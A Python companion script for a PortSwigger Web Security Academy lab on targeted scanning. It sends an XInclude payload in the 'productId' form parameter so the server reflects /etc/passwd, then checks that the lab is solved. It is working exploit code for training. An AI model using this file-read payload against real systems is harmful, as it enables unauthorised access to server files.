#!/usr/bin/env python3
"""
Discovering vulnerabilities quickly with targeted scanning
PortSwigger Web Security Academy -- Essential Skills

Companion script for the writeup: 01-discovering-vulnerabilities-quickly-with-targeted-scanning.md

What this does:
    Sends an XInclude payload in the form-encoded "productId" parameter of
    the /product/stock endpoint. Nothing about the request looks XML-related
    (plain form encoding, no XML content type), but the backend embeds the
    value into a server-side XML document before validating it, so an
    xi:include directive still resolves and reflects the target file's
    contents back in the error message.

Usage:
    python 01-discovering-vulnerabilities-quickly-with-targeted-scanning.py <lab-url>
    e.g. python 01-discovering-vulnerabilities-quickly-with-targeted-scanning.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import sys
import httpx

XINCLUDE_PAYLOAD = (
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
    '<xi:include parse="text" href="file:///etc/passwd"/></foo>'
)


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    r = client.post(f"{lab_url}/product/stock", data={
        "productId": XINCLUDE_PAYLOAD,
        "storeId": "1",
    })
    print(f"[*] Response status: {r.status_code}")

    if "root:x:0:0" in r.text:
        idx = r.text.find("root:x:0:0")
        print(f"[+] /etc/passwd contents reflected in the response:")
        print(f"    {r.text[max(0, idx-30):idx+120]}")
    else:
        print("[-] No file contents reflected -- check the error message manually:")
        print(f"    {r.text[:300]}")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
